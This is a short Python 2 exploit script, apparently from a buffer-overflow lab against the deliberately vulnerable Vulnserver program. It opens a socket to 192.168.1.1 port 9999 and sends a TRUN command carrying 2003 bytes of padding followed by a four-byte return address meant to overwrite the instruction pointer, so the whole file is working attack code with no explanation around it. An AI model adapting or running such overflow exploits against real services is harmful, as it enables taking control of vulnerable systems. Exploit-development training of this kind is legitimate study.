#!/usr/bin/python
import socket
import sys

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect=s.connect(('192.168.1.1',9999))
	s.send(('TRUN /.:/' + shellcode))
except:
	print"check debugger"
s.close()